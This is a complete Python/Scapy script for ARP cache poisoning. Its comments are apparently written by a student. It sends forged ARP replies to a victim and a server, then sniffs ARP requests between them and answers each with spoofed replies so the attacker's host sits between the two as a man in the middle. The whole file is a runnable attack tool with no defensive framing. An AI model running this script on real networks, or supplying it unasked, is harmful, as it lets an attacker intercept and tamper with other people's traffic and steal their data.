#!/usr/bin/python3
import sys
import time
from scapy.all import sniff
from scapy.all import sendp
from scapy.all import ARP
from scapy.all import Ether

CRED = '\033[91m'
CBLUE = '\033[44m'
CEND = '\033[0m'
if len(sys.argv) < 4:
    print(CRED + sys.argv[0] + " <victim_ip>" + " <server_ip>" + "<iface=eth0>" + CEND)
    sys.exit(1)  # Making sure you got enough arguments if not close the program

victim_ip = sys.argv[1]  # taking the first and second arguments that were given
server_ip = sys.argv[2]
ethernet = Ether()  # Creating a Ether object

arp = ARP(pdst=victim_ip, psrc=server_ip,
          op="is-at")  # Creating an ARP object with victim ip as destination and source as server
packet = ethernet / arp  # inheritence
sendp(packet, iface=sys.argv[3])  # Sending the packet

arp = ARP(pdst=server_ip, psrc=victim_ip, op="is-at")  # Creating an ARP object
packet = ethernet / arp  # inheritence
sendp(packet, iface=sys.argv[3])  # Sending the packet


def arp_poisoning(packet):  # creating list of ip's to attack
    attack_list = []
    attack_list.append(sys.argv[1])
    attack_list.append(sys.argv[2])

    # check if victim and host in attack list
    if packet[ARP].op == 1 and packet[ARP].pdst in attack_list and packet[ARP].psrc in attack_list:

        # Create a Ether object with desination as the mac adress of the input packet
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"  # the operating of the packet, stating ip x is at mac adress...
        answer[ARP].hwdst = packet[ARP].hwsrc  # the mac adress
        answer[ARP].psrc = packet[ARP].pdst  # the destination of the packet - ip
        answer[ARP].pdst = packet[ARP].psrc  # the source of the packet - ip

        # printing who is getting spoofed and who is the source with fancy colors
        print(CBLUE + "Spoofing " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me" + CEND)

        # show the information held in answer object
        answer.show()
        sendp(answer, iface=sys.argv[3])  # send the packet answer over the given interface as the third argument
        time.sleep(1)  # wait 1 sec
        sendp(answer, iface=sys.argv[3])
        time.sleep(1)
        sendp(answer, iface=sys.argv[3])


# START
sniff(prn=arp_poisoning, filter="arp", iface=sys.argv[3], store=0)
